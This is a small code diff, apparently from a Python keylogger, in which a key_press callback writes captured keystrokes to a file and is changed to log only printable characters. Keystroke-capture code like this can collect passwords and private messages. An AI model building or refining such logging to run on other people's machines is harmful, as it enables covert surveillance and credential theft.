@@ -3,7 +3,8 @@ import Save_to_file
 
 
 def key_press(key):
-    Save_to_file.save_to_file(str(key))
+    if hasattr(key, 'char'):
+        Save_to_file.save_to_file(key.char)
 
 
 def hook_keyboard():
